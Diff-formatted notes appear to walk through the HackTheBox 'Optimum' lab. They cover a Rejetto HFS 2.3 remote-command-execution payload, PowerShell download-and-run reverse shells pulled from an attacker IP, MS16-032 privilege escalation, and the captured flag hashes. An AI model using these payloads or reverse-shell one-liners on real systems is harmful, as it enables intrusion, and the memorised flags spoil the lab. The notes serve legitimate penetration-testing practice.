@@ -1,0 +1,86 @@
+let's enumerate first:
+command: sudo rustscan -a 10.10.10.8
+result:
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack ttl 127
+
+command: sudo nmap -sSVC -A -p 80 10.10.10.8
+result:
+PORT   STATE SERVICE VERSION
+80/tcp open  http    HttpFileServer httpd 2.3
+|_http-server-header: HFS 2.3
+|_http-title: HFS /
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+access: http://10.10.10.8/
+version: HttpFileServer 2.3
+
+command: searchsploit HttpFileServer 2.3         
+
+----------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                   |  Path
+----------------------------------------------------------------- ---------------------------------
+Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)      | windows/webapps/49125.py
+----------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+comand: sudo tcpdump -i tun0 icmp
+access: http://10.10.10.8/?search=%00{.+exec|cmd.exe+/c+ping+/n+1+10.10.16.19.}
+result:
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+23:43:28.241753 IP 10.10.10.8 > 10.10.16.19: ICMP echo request, id 1, seq 1, length 40
+23:43:28.241769 IP 10.10.16.19 > 10.10.10.8: ICMP echo reply, id 1, seq 1, length 40
+23:43:28.241775 IP 10.10.10.8 > 10.10.16.19: ICMP echo request, id 1, seq 2, length 40
+23:43:28.241803 IP 10.10.16.19 > 10.10.10.8: ICMP echo reply, id 1, seq 2, length 40
+23:43:28.241818 IP 10.10.10.8 > 10.10.16.19: ICMP echo request, id 1, seq 3, length 40
+23:43:28.241823 IP 10.10.16.19 > 10.10.10.8: ICMP echo reply, id 1, seq 3, length 40
+23:43:28.241843 IP 10.10.10.8 > 10.10.16.19: ICMP echo request, id 1, seq 4, length 40
+23:43:28.241848 IP 10.10.16.19 > 10.10.10.8: ICMP echo reply, id 1, seq 4, length 40
+
+get power shelll shell from here:
+https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1
+put to rev.ps1 change ip and port
+
+command: python3 -m http.server 7979
+command: sudo rlwrap nc -lvnp 7979
+access: http://10.10.10.8/?search=%00{.exec|C%3a\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.16.19/rev.ps1').}
+
+PS C:\users\kostas\desktop> type user.txt
+e146fdf23d955bbce018a7f6f60f7744
+
+get sherlock for enumeration from here:
+https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
+add Find-AllVulns on end of line on Sherlock.ps1
+
+target> IEX(New-Object Net.WebClient).downloadstring('http://10.10.16.19/Sherlock.ps1')
+take attention:Title      : Secondary Logon Handle
+MSBulletin : MS16-032
+CVEID      : 2016-0099
+Link       : https://www.exploit-db.com/exploits/39719/
+VulnStatus : Appears Vulnerable
+
+PS C:\users\kostas\desktop> [Environment]::Is64BitProcess
+False
+
+let's upgrade shell to 64bit.
+access: http://10.10.10.8/?search=%00{.exec|C%3a\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.16.19/rev.ps1').}
+
+get exploit powershell from here:
+https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1
+
+add this on end of line:
+Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.16.19/rev.ps1')" 
+change port on rev.ps1 to 4444
+
+command: nc -lvnp 4444
+target> IEX(New-Object Net.WebClient).downloadstring('http://10.10.16.19/Invoke-MS16032.ps1')
+
+PS C:\users\administrator\Desktop> type root.txt
+cb81a96a69371a0fabe15e787bbea678
+
+resource:
+https://0xdf.gitlab.io/2021/03/17/htb-optimum.html#the-importance-of-architecture
